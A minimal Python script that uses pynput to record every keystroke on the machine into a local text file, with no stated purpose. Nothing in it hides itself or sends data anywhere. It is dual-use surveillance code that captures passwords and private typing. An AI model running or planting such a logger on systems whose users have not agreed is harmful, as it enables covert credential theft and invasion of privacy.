from pynput.keyboard import Key, Listener
import pyautogui
import time

open('keyboard_rec.txt', 'w').close()

def on_press(key):
    with open("keyboard_rec.txt", "a") as f:
        try:
            f.write(format(key.char) + '\n')
        except AttributeError:
            f.write(format(key) +'\n')

with Listener(on_press=on_press) as listener:
    listener.join()